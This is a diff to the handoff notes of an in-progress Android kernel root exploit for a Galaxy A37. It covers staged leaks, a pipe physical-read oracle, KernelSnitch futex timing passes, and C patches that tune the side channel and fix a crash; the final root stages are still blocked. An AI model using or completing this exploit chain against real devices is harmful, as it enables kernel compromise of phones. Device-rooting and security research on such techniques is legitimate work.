@@ -15,7 +15,7 @@ are" note for resuming on a fresh device/chat.
 | 2. skb / phys leak | ✅ fixed | logs: `prepared base=ffffff...` |
 | 3. pipe oracle (phys read) | ✅ works | logs: `p0 pipe oracle prepared base=ffffff805efa0000 pipes=240` |
 | 4. **kernel page (fops) — 1st KernelSnitch pass** | ✅ **SUCCESS** | logs: `MATCH cand=ffffff805efa12c0 nmatch=4/7 need=4` |
-| 4b. **pipe buffer page — 2nd KernelSnitch pass** | ❌ **FAILS** | logs: `KernelSnitch mm_struct leak failed` then `prepare_kernel_page retry 1/8`, scan frozen at `130000/131072` when test was stopped |
+| 4b. **pipe buffer page — 2nd KernelSnitch pass** | ❌ **FAILS** (fix applied 2026-08-28, **pending device test**) | logs: `KernelSnitch mm_struct leak failed` then `prepare_kernel_page retry 1/8`, scan frozen at `130000/131072` when test was stopped. Corrected fix: 2nd pass now uses the SAME profile as the working 1st pass (2048/96/12) + 512 KiB waiter stack (§3d) so the pile-up signal is real and the VA crash is avoided. |
 | 5-7. writer → fops → root | ⏸ blocked on 4b | — |
 
 **Bottom line:** The 1st KernelSnitch pass (fops mm_struct leak) and the P0 pipe
@@ -96,7 +96,7 @@ Two changes (full diffs in `RMGP/src/*.c`, the working tree in this handoff is
 already patched):
 
 ### 3a. `src/pipe.c` — move `setup_kernelsnitch()` before `clone_leak_child()` and
-down-throttle the 2nd pass
+match the 1st-pass profile for the 2nd pass
 
 ```diff
  uintptr_t prepare_pipe_buffer_page_child(void) {
@@ -106,7 +106,9 @@ down-throttle the 2nd pass
 -  setup_kernelsnitch();
 -  pid_t leak_child = clone_leak_child();
 +  setup_kernelsnitch();
-+  kernelsnitch_set_profile(ks, 256, 128, 1);   /* 2048->256 threads, avg 8->1 */
++  kernelsnitch_set_profile(ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
++                           SLIDE_KSNITCH_REPEAT_MEASUREMENT,
++                           SLIDE_KSNITCH_AVERAGE);   /* = 2048 / 96 / 12 */
 +  pid_t leak_child = clone_leak_child();
    ...
 -  for (size_t i = 0; i < post.mm_cnt; i++) { ... }
@@ -117,9 +119,44 @@ down-throttle the 2nd pass
    for (size_t i = 0; i < post.mm_cnt; i++) { ... }
 ```
 
-(So `setup_kernelsnitch()` runs once, before the leak child is forked, and the
-profile is set to 256 threads / 128 measurements / average 1 — 1/8 the memory
-pressure of the default 2048.)
+**Why this (and not the earlier 256-thread throttle):** An earlier attempt set
+the 2nd pass to `kernelsnitch_set_profile(ks, 256, 128, 1)` to dodge a device
+crash. That removed the crash but produced **spurious collisions** — the 2nd pass
+found 7 candidates yet every MATCH candidate returned `nmatch=0` (see §4, run9.log:
+`KSDIAG approx=18 thr=180 ...` with `average=1` the timing signal is just noise).
+The 1st pass *works* with profile **2048 threads / 96 measurements / average 12**,
+so the 2nd pass must use the **same** profile to get a real pile-up signal. The
+device crash from 2048 threads is instead fixed by shrinking the per-thread stack
+(see §3d), so we no longer need to weaken the profile.
+
+### 3d. `src/kernelsnitch/kernelsnitch.h` — tiny per-waiter stack (crash fix)
+
+`__increase()` spawns `appended_futexes` threads. With glibc's default 8 MiB
+stack, 2048 threads = **16 GiB** of virtual address space. The 2nd pass runs in a
+`fork()`ed child that already inherits the parent's 64 GiB `PROT_NONE` futex
+arena plus all the pipe/memfd mappings, so the 16 GiB mmap fails and the pass
+**crashes the device**. Fix: give each waiter a 512 KiB stack (`KS_THREAD_STACK_SZ`),
+cutting the requirement to ~1 GiB — plenty even when fragmented, while leaving the
+pile-up depth (and thus the timing signal) identical to the 1st pass.
+
+```diff
++#define KS_THREAD_STACK_SZ (512 * 1024)
+ ...
+ static void __increase(...) {
+     ...
++    pthread_attr_t attr;
++    pthread_attr_init(&attr);
++    pthread_attr_setstacksize(&attr, KS_THREAD_STACK_SZ);
+     for (...) {
+-        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase, ...));
++        SYSCHK(pthread_create(&ks->increase_tids[i], &attr, __do_increase, ...));
+     }
++    pthread_attr_destroy(&attr);
+     WAIT();
+ }
+```
+
+> NOTE: the 1st pass also benefits (uses the same small stack) — strictly safer.
 
 ### 3b. `src/util.c` — export `ks` and enable selftest/verbose wiring
 
@@ -262,6 +299,14 @@ This handoff repo's own history (`2a325b2`) is preserved in `HANDOFF_REPO.bundle
 
 ## 7. Open questions / risks
 
+- **The 2026-08-28 2nd-pass fix is UNVERIFIED on-device** (emulator offline at
+  handoff time). It is built into `selftest/a37-final.so`. The hypothesis: the
+  earlier `average=1` profile produced false collisions; restoring 2048/96/12
+  plus a 512 KiB waiter stack gives the same real signal as the 1st pass without
+  the VA crash. Verify by running the exploit; if the 2nd pass still fails to
+  MATCH, next levers are (a) confirm child-mm vs bruteforce-mm hashing match,
+  (b) raise `KS_THREAD_STACK_SZ` back toward 1-2 MiB if 512 KiB is too tight, or
+  (c) free the 1st pass's 64 GiB futex arena before the 2nd pass.
 - The v2root loader binary is NOT in this workspace (it lives on-device at
   `/data/local/tmp/v2root`). Rebuild it from the payload repo
   (`Root-My-Galaxy-Payloads-A37-Clean` / `rmg-a37`) or pull from device when online.
